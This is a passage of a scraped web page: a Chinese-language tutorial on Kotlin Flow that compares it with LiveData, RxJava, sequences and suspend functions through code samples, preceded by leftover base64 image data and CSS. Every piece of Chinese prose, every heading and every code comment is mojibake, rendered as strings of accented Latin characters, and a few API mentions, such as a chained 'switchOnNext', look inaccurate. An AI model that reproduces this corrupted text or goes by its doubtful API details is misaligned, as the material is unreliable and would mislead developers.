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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦ Flowï¼Ÿâ€”â€” ä» LiveData å’Œ RxJava è¯´èµ·</h2>
<h3 data-id="heading-1"><strong>æ ¸å¿ƒé—®é¢˜</strong></h3>
<ul>
<li><code>LiveData</code>Â ä¸æ˜¯åç¨‹åŸç”Ÿï¼Œ<strong>æ— æ³•å¤„ç†å¤æ‚å¼‚æ­¥é€»è¾‘</strong></li>
<li><code>RxJava</code>Â å­¦ä¹ æ›²çº¿é™¡å³­ï¼Œä¸”ä¸åç¨‹æ··ç”¨æ˜“å‡ºé”™</li>
<li>éœ€è¦ä¸€ç§<strong>å†·æµï¼ˆCold Streamï¼‰</strong> ã€<strong>ç»“æ„åŒ–å¹¶å‘å®‰å…¨</strong>ã€<strong>è‡ªåŠ¨ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥</strong>çš„æ–¹æ¡ˆ</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// LiveData åŸºæœ¬ä½¿ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _data = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: LiveData&lt;String&gt; = _data
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">loadData</span><span class="hljs-params">()</span></span> {
        _data.value = <span class="hljs-string">"Hello"</span>
    }
}

<span class="hljs-comment">// Activity ä¸­è§‚å¯Ÿ</span>
viewModel.<span class="hljs-keyword">data</span>.observe(<span class="hljs-keyword">this</span>) { <span class="hljs-keyword">data</span> -&gt;
    <span class="hljs-comment">// UI æ›´æ–°</span>
}

<span class="hljs-comment">// âŒæ— æ³•å¤„ç†å¤šä¸ªè¿ç»­å¼‚æ­¥äº‹ä»¶</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span> {
    viewModelScope.launch {
        <span class="hljs-keyword">val</span> data1 = api.fetchData1()  <span class="hljs-comment">// æŒ‚èµ·å‡½æ•°</span>
        _data1.value = data1
        
        <span class="hljs-keyword">val</span> data2 = api.fetchData2()  <span class="hljs-comment">// ç¬¬äºŒä¸ªè¯·æ±‚</span>
        _data2.value = data2
    }
}

<span class="hljs-comment">// âŒ å¿«é€Ÿå‘å°„æ•°æ®æ—¶ï¼Œæ—§å€¼ä¼šè¢«è¦†ç›–</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rapidUpdates</span><span class="hljs-params">()</span></span> {
    repeat(<span class="hljs-number">100</span>) { i -&gt;
        _data.value = <span class="hljs-string">"Value <span class="hljs-variable">$i</span>"</span>  <span class="hljs-comment">// åªæœ‰æœ€åä¸€ä¸ªå€¼è¢«æ¥æ”¶</span>
    }
}

<span class="hljs-comment">// âŒ çº¿ç¨‹åˆ‡æ¢ä¸å¤Ÿçµæ´»,é»˜è®¤åœ¨ä¸»çº¿ç¨‹æ›´æ–°</span>
viewModelScope.launch(Dispatchers.IO) {
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = repository.fetchData()  <span class="hljs-comment">// IO çº¿ç¨‹</span>
    _data.postValue(<span class="hljs-keyword">data</span>)  <span class="hljs-comment">// å¿…é¡»ç”¨ postValue</span>
}

<span class="hljs-comment">// âŒ ç»„åˆèƒ½åŠ›æœ‰é™,éš¾ä»¥ç»„åˆå¤šä¸ªæ•°æ®æº</span>
<span class="hljs-keyword">val</span> liveData1: LiveData&lt;A&gt;
<span class="hljs-keyword">val</span> liveData2: LiveData&lt;B&gt;
<span class="hljs-comment">// åˆå¹¶éœ€è¦ Transformations.switchMap</span>
<span class="hljs-keyword">val</span> result = Transformations.switchMap(liveData1) { a -&gt;
    Transformations.map(liveData2) { b -&gt;
        a to b
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// RxJava å¤„ç†å¤æ‚å¼‚æ­¥æµ</span>
Observable.interval(<span class="hljs-number">1</span>, TimeUnit.SECONDS)
    .map { it * <span class="hljs-number">2</span> }
    .filter { it % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> }
    .flatMap { api.fetchData(it) }
    .subscribeOn(Schedulers.io())
    .observeOn(AndroidSchedulers.mainThread())
    .subscribe(
        { <span class="hljs-keyword">data</span> -&gt; updateUI(<span class="hljs-keyword">data</span>) },
        { error -&gt; showError(error) }
    )
    
<span class="hljs-comment">// âŒRxJava çš„å¤æ‚æ€§</span>
Observable.create&lt;String&gt; { emitter -&gt;
    <span class="hljs-comment">// æ‰‹åŠ¨ç®¡ç†èµ„æº</span>
    <span class="hljs-keyword">val</span> subscription = someApi.subscribe { <span class="hljs-keyword">data</span> -&gt;
        emitter.onNext(<span class="hljs-keyword">data</span>)
    }
    emitter.setCancellable { subscription.unsubscribe() }
}
.map { ... }
.flatMap { ... }
.switchOnNext { ... }

<span class="hljs-comment">// âŒå†…å­˜æ³„æ¼é£é™©,éœ€è¦æ‰‹åŠ¨ç®¡ç†ç”Ÿå‘½å‘¨æœŸ</span>
<span class="hljs-keyword">val</span> disposables = CompositeDisposable()

disposables.add(
    api.getData()
        .subscribe { <span class="hljs-keyword">data</span> -&gt; <span class="hljs-comment">/* å¤„ç†æ•°æ® */</span> }
)

<span class="hljs-comment">// å¿…é¡»è®°å¾—æ¸…ç†</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span></span> {
    disposables.clear()
    <span class="hljs-keyword">super</span>.onDestroy()
}

</code></pre>
<h3 data-id="heading-2">Flow çš„æ ¸å¿ƒä¼˜åŠ¿</h3>
<ol>
<li><strong>åŸºäºåç¨‹</strong>ï¼šå¤©ç„¶æ”¯æŒ suspend å‡½æ•°ï¼Œæ— ç¼é›†æˆ Kotlin åç¨‹ã€‚</li>
<li><strong>å†·æµï¼ˆCold Streamï¼‰</strong> ï¼šåªæœ‰è®¢é˜…æ—¶æ‰æ‰§è¡Œï¼ŒèŠ‚çœèµ„æºã€‚</li>
<li><strong>ç»“æ„åŒ–å¹¶å‘</strong>ï¼šè‡ªåŠ¨éµå¾ªåç¨‹ä½œç”¨åŸŸï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</li>
<li><strong>ä¸°å¯Œçš„æ“ä½œç¬¦</strong>ï¼šç±»ä¼¼ RxJavaï¼Œä½†æ›´ç¬¦åˆ Kotlin ä¹ æƒ¯ï¼ˆå¦‚Â <code>map</code>,Â <code>filter</code>,Â <code>combine</code>,Â <code>flatMapLatest</code>Â ç­‰ï¼‰ã€‚</li>
<li><strong>æ”¯æŒèƒŒå‹</strong>ï¼šé€šè¿‡æŒ‚èµ·æœºåˆ¶è‡ªç„¶å¤„ç†èƒŒå‹ï¼ˆä¸åƒ RxJava éœ€è¦æ˜¾å¼ç­–ç•¥ï¼‰ã€‚</li>
<li><strong>å¯ä¸ LiveData äº’è½¬</strong>ï¼š<code>flow.asLiveData()</code>Â ç”¨äº UI å±‚ã€‚</li>
</ol>
<h3 data-id="heading-3">ç¤ºä¾‹ï¼šç”¨ Flow å®ç°ç›¸åŒé€»è¾‘ï¼ˆæ›´ç®€æ´ã€å®‰å…¨ï¼‰</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRepository</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchDataFlow</span><span class="hljs-params">()</span></span>: Flow&lt;List&lt;Item&gt;&gt; = flow {
        emit(repository.fetchFromDb()) <span class="hljs-comment">// å¯ä»¥æ˜¯ Room çš„ Flow æŸ¥è¯¢</span>
        <span class="hljs-keyword">val</span> remote = apiService.getItems() <span class="hljs-comment">// suspend call</span>
        emit(mergeWithRemote(remote))
    }.flowOn(Dispatchers.IO) <span class="hljs-comment">// æŒ‡å®šä¸Šæ¸¸è¿è¡Œåœ¨ IO çº¿ç¨‹</span>
}

<span class="hljs-comment">// ViewModel ä¸­</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">val</span> uiState: LiveData&lt;UiState&gt; = repository.fetchDataFlow()
        .map { UiState.Success(it) }
        .<span class="hljs-keyword">catch</span> { emit(UiState.Error(it.message)) }
        .asLiveData() <span class="hljs-comment">// è½¬ä¸º LiveData ä¾› UI è§‚å¯Ÿ</span>
}
</code></pre>
<h2 data-id="heading-4">äºŒã€Flow åŸºç¡€ä¸‰è¦ç´ </h2>
<h3 data-id="heading-5">1.Â <strong>åˆ›å»º Flow</strong></h3>
<ul>
<li><code>flow { }</code>ï¼šæœ€å¸¸ç”¨ï¼Œæ”¯æŒÂ <code>emit()</code>Â å’ŒÂ <code>suspend</code>Â å‡½æ•°</li>
<li><code>channelFlow { }</code>ï¼šé«˜çº§ï¼Œæ”¯æŒåœ¨ä¸åŒåç¨‹ä¸­ emitï¼ˆçƒ­æµé›å½¢ï¼‰</li>
<li><code>asFlow()</code>ï¼šå°†é›†åˆã€åºåˆ—è½¬ä¸º Flow</li>
<li><code>callbackFlow { }</code>ï¼šæ¡¥æ¥å›è°ƒ APIï¼ˆå¦‚ä¼ æ„Ÿå™¨ã€Firebaseï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> numberFlow = flow {
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        delay(<span class="hljs-number">100</span>)
        emit(i) <span class="hljs-comment">// æŒ‚èµ·ç‚¹</span>
    }
}
</code></pre>
<h3 data-id="heading-6">2.Â <strong>ä¸­é—´æ“ä½œç¬¦ï¼ˆå¯é“¾å¼ï¼‰</strong></h3>
<ul>
<li><code>map</code>,Â <code>filter</code>,Â <code>onEach</code>,Â <code>transform</code>,Â <code>take</code>,Â <code>drop</code>,Â <code>debounce</code>,Â <code>distinctUntilChanged</code>...</li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™äº›æ“ä½œç¬¦æœ¬èº«ä¸è§¦å‘æ‰§è¡Œï¼ˆå†·æµç‰¹æ€§ï¼‰</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">numberFlow
    .map { it * <span class="hljs-number">2</span> }
    .filter { it &gt; <span class="hljs-number">2</span> }
    .onEach { println(<span class="hljs-string">"Processing: <span class="hljs-variable">$it</span>"</span>) }
</code></pre>
<h3 data-id="heading-7">3.Â <strong>ç»ˆç«¯æ“ä½œç¬¦ï¼ˆè§¦å‘æ‰§è¡Œï¼‰</strong></h3>
<ul>
<li><code>collect { }</code>ï¼šæœ€åŸºç¡€</li>
<li><code>launchAndCollectIn(scope)</code>ï¼šAndroid KTX æ‰©å±•ï¼ˆå·²å¼ƒç”¨ï¼Œæ”¹ç”¨Â <code>repeatOnLifecycle</code>ï¼‰</li>
<li><code>toList()</code>,Â <code>first()</code>,Â <code>single()</code>ï¼šç”¨äºæµ‹è¯•æˆ–å•æ¬¡è·å–</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">lifecycleScope.launch {
    numberFlow.collect { value -&gt;
        textView.text = value.toString()
    }
}
</code></pre>
<h2 data-id="heading-8">ä¸‰ã€è¿”å›å¤šä¸ªå€¼-é›†åˆ-åºåˆ—-æŒ‚èµ·å‡½æ•°</h2>
<h3 data-id="heading-9">1. è¿”å›å¤šä¸ªå€¼çš„ä¼ ç»Ÿæ–¹å¼</h3>

























<table><thead><tr><th>æ–¹å¼</th><th>ç‰¹ç‚¹</th><th>é—®é¢˜</th></tr></thead><tbody><tr><td><code>List&lt;T&gt;</code></td><td>ä¸€æ¬¡æ€§è¿”å›æ‰€æœ‰å€¼</td><td>å¿…é¡»ç­‰å…¨éƒ¨æ•°æ®å‡†å¤‡å¥½ï¼Œå†…å­˜å ç”¨é«˜</td></tr><tr><td><code>Sequence&lt;T&gt;</code></td><td>æƒ°æ€§æ±‚å€¼ï¼ŒåŒæ­¥ç”Ÿæˆ</td><td><strong>ä¸èƒ½åŒ…å« suspend å‡½æ•°</strong>ï¼Œæ— æ³•å¤„ç†å¼‚æ­¥</td></tr><tr><td><code>suspend fun List&lt;T&gt;</code></td><td>å¼‚æ­¥è·å–å®Œæ•´åˆ—è¡¨</td><td>ä»éœ€ç­‰å¾…å…¨éƒ¨å®Œæˆï¼Œæ— æ³•â€œè¾¹ç®—è¾¹å‘â€</td></tr></tbody></table>
<h3 data-id="heading-10">2. é›†åˆ (Collection) - ä¸€æ¬¡æ€§è¿”å›æ‰€æœ‰å€¼</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// List - ç«‹å³è®¡ç®—å¹¶è¿”å›æ‰€æœ‰å€¼</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCitiesList</span><span class="hljs-params">()</span></span>: List&lt;String&gt; {
    println(<span class="hljs-string">"å¼€å§‹è®¡ç®—åˆ—è¡¨..."</span>)
    <span class="hljs-keyword">val</span> result = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        Thread.sleep(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶è®¡ç®—</span>
        result.add(<span class="hljs-string">"City<span class="hljs-variable">$i</span>"</span>)
        println(<span class="hljs-string">"æ·»åŠ  City<span class="hljs-variable">$i</span>"</span>)
    }
    <span class="hljs-keyword">return</span> result
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> cities = getCitiesList()  <span class="hljs-comment">// è¿™é‡Œå°±æ‰§è¡Œäº†æ‰€æœ‰è®¡ç®—</span>
    println(<span class="hljs-string">"åˆ—è¡¨è®¡ç®—å®Œæˆ"</span>)
    cities.forEach { println(<span class="hljs-string">"è®¿é—®: <span class="hljs-variable">$it</span>"</span>) }
}
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å¿…é¡»ç­‰å¾…æ‰€æœ‰å€¼è®¡ç®—å®Œæˆæ‰èƒ½è¿”å›</li>
<li>å ç”¨å†…å­˜å­˜å‚¨æ‰€æœ‰å…ƒç´ </li>
<li>ä¸èƒ½è¡¨ç¤º"æ­£åœ¨è¿›è¡Œä¸­"çš„çŠ¶æ€</li>
</ul>
<h3 data-id="heading-11">3. åºåˆ— (Sequence) - æƒ°æ€§è¿”å›å¤šä¸ªå€¼</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Sequence - æƒ°æ€§è®¡ç®—</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCitiesSequence</span><span class="hljs-params">()</span></span>: Sequence&lt;String&gt; = sequence {
    println(<span class="hljs-string">"å¼€å§‹åºåˆ—è®¡ç®—..."</span>)
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        Thread.sleep(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶è®¡ç®—</span>
        yield(<span class="hljs-string">"City<span class="hljs-variable">$i</span>"</span>)
        println(<span class="hljs-string">"äº§ç”Ÿ City<span class="hljs-variable">$i</span>"</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> sequence = getCitiesSequence()  <span class="hljs-comment">// è¿™é‡Œä¸æ‰§è¡Œè®¡ç®—</span>
    println(<span class="hljs-string">"åºåˆ—åˆ›å»ºå®Œæˆ"</span>)
    
    sequence.forEach { 
        println(<span class="hljs-string">"è®¿é—®: <span class="hljs-variable">$it</span>"</span>)  <span class="hljs-comment">// æ¯æ¬¡è®¿é—®æ—¶æ‰è®¡ç®—ä¸‹ä¸€ä¸ª</span>
    }
}
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>æƒ°æ€§è®¡ç®—ï¼ŒæŒ‰éœ€ç”Ÿæˆ</li>
<li>èŠ‚çœå†…å­˜</li>
<li>å¯ä»¥è¡¨ç¤ºæ— é™åºåˆ—</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ åºåˆ—ä¸­ä¸èƒ½è°ƒç”¨æŒ‚èµ·å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getDataSequence</span><span class="hljs-params">()</span></span>: Sequence&lt;String&gt; = sequence {
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        delay(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼ä¸èƒ½åœ¨åºåˆ—ä¸­ä½¿ç”¨æŒ‚èµ·å‡½æ•°</span>
        yield(<span class="hljs-string">"Data<span class="hljs-variable">$i</span>"</span>)
    }
}
</code></pre>
<h3 data-id="heading-12">4. æŒ‚èµ·å‡½æ•° (suspend) - è¿”å›å•ä¸ªå€¼</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// suspend å‡½æ•° - è¿”å›å•ä¸ªå€¼</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserData</span><span class="hljs-params">()</span></span>: User {
    delay(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
    <span class="hljs-keyword">return</span> User(<span class="hljs-string">"John"</span>, <span class="hljs-number">25</span>)
}

<span class="hljs-comment">// è¿”å› List - ä»ç„¶æ˜¯å•ä¸ªè¿”å›å€¼</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchAllUsers</span><span class="hljs-params">()</span></span>: List&lt;User&gt; {
    delay(<span class="hljs-number">1000</span>)
    <span class="hljs-keyword">return</span> listOf(User(<span class="hljs-string">"John"</span>), User(<span class="hljs-string">"Jane"</span>))
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> user = fetchUserData()  <span class="hljs-comment">// ç­‰å¾…1ç§’åå¾—åˆ°å•ä¸ªç”¨æˆ·</span>
    println(<span class="hljs-string">"ç”¨æˆ·: <span class="hljs-variable">$user</span>"</span>)
    
    <span class="hljs-keyword">val</span> users = fetchAllUsers()  <span class="hljs-comment">// ç­‰å¾…1ç§’åå¾—åˆ°æ‰€æœ‰ç”¨æˆ·</span>
    println(<span class="hljs-string">"æ‰€æœ‰ç”¨æˆ·: <span class="hljs-variable">$users</span>"</span>)
}
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ æ— æ³•åœ¨è¿‡ç¨‹ä¸­"æ¨é€"æ•°æ®</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUsersStream</span><span class="hljs-params">()</span></span>: ??? {
    <span class="hljs-comment">// æ— æ³•åšåˆ°ï¼šæ”¶åˆ°ä¸€ä¸ªç”¨æˆ·å°±é€šçŸ¥ä¸€æ¬¡</span>
    <span class="hljs-comment">// å¿…é¡»ç­‰æ‰€æœ‰ç”¨æˆ·éƒ½è·å–å®Œæˆåä¸€æ¬¡æ€§è¿”å›</span>
}
</code></pre>
<h2 data-id="heading-13">å››ã€é€šè¿‡ Flow å¼‚æ­¥è¿”å›å¤šä¸ªå€¼</h2>
<ul>
<li><strong>åƒå†™åŒæ­¥ä»£ç ä¸€æ ·ï¼Œå®‰å…¨åœ°å‘å°„å¼‚æ­¥åºåˆ—å€¼</strong></li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Flow - å¼‚æ­¥æµå¼è¿”å›</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCitiesFlow</span><span class="hljs-params">()</span></span>: Flow&lt;String&gt; = flow {
    println(<span class="hljs-string">"Flow å¼€å§‹å‘å°„"</span>)
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        delay(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// âœ… å¯ä»¥è°ƒç”¨æŒ‚èµ·å‡½æ•°</span>
        emit(<span class="hljs-string">"City<span class="hljs-variable">$i</span>"</span>)
        println(<span class="hljs-string">"å‘å°„ City<span class="hljs-variable">$i</span>"</span>)
    }
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
